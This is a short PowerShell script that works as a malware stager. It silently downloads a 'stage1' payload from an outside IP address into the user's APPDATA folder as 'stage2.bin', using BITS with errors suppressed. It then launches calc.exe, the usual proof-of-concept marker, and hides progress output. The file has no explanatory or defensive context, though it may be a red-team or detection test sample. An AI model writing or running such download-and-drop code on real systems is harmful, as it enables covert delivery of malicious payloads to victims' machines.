[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.23/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\stage2.bin",
    [int]$RequestTimeout = 196
)
Start-BitsTransfer -Source $PayloadUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
